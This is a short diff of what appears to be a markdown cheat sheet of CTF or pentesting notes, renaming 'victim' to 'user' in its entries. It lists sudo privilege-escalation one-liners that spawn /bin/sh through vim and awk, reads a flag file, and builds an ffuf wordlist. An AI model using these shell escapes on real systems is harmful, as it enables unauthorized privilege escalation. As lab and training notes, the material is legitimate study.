@@ -51,8 +51,8 @@ Poratble Database
 ##### sudo -u user vim -c ':!/bin/sh'
 
 ### Privilege Escalation abusing awk
-##### sudo -u victim awk 'BEGIN {system("/bin/sh")}'
-##### sudo -u victim awk {'print $1'} ~/flag.txt
+##### sudo -u user awk 'BEGIN {system("/bin/sh")}'
+##### sudo -u user awk {'print $1'} ~/flag.txt
 
 ### Create wordlist for testing opensource projects
 #### find | sed 's/\.//g' > ffufwordlist.txt
